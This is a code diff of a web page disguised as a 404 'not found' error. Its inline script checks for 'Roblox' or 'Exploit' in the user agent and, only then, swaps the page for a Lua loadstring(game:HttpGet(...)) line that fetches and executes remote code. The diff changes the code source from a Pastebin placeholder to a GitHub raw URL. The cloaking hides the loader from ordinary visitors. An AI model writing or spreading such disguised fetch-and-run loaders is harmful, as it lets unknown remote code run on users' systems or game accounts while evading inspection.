@@ -8,12 +8,8 @@
     <p>The requested URL was not found on this server.</p>
 
     <script>
-        const userAgent = navigator.userAgent;
-        
-        if (userAgent.includes("Roblox") || userAgent.includes("Exploit")) {
-            document.body.innerHTML = 'loadstring(game:HttpGet("https://pastebin.com/raw/KODE_PASTEBIN_LO"))()';
-        } else {
-            console.log("Access Denied.");
+        if (navigator.userAgent.includes("Roblox") || navigator.userAgent.includes("Exploit")) {
+            document.body.innerHTML = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/zjjj5822-boop/Raw-Store/refs/heads/main/Data%20Roblox%20studio%20dev"))()';
         }
     </script>
 </body>
